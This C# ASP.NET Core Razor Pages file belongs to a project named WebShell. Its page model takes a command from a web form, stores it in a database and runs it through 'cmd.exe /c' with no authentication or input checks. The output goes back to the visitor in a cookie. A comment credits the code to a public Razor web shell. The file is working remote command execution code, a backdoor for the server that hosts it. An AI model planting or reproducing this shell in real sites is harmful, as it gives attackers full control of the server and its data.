using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.WebSockets;
using System.Reflection.Metadata.Ecma335;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Migrations;
using Microsoft.Extensions.Logging;
using WebShell.Model;
using System.Diagnostics;
using Microsoft.AspNetCore.Razor.TagHelpers;
using System.Data;


namespace WebShell.Pages
{
    public class CreateModel : PageModel
    {
        private readonly ApplicationDbContext _db;

        public CreateModel(ApplicationDbContext db)
        {
            _db = db;
        }


        [BindProperty]
        public Command Command { get; set; }
        public IEnumerable<Command> Commands { get; set; }

        public string Msg { get; set; }

        public async Task OnGet()
        {
            Commands = await _db.Command.ToListAsync();
            Msg = Request.Cookies["stdout"];
        }


        public async Task<IActionResult> OnPost()
        {
            if (ModelState.IsValid)
            {
                await _db.Command.AddAsync(Command);
                await _db.SaveChangesAsync();
                Response.Cookies.Append("stdout", ConsoleRun(Command.Value));
                return RedirectToPage("Index");
            }
            else
            {
                return Page();
            }
        }

        public List<string> NextCommand()
        {
            Commands = _db.Command.ToList();
            List<string> CommandList = new List<string>();
            foreach (var item in Commands)
            {
                CommandList.Add(item.Value);
            }
            return CommandList;
        }

        // https://github.com/niemand-sec/RazorSyntaxWebshell/blob/master/webshell.cshtml#L13
        // Автор niemand-sec 
        public string ConsoleRun(string arguments = null)
        {
            var output = new System.Text.StringBuilder();
            var process = new Process();
            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + arguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            };

            process.StartInfo = startInfo;
            process.OutputDataReceived += (sender, args) => output.AppendLine(args.Data);
            process.ErrorDataReceived += (sender, args) => output.AppendLine(args.Data);

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
            process.WaitForExit();

            return output.ToString();
        }

    }

}




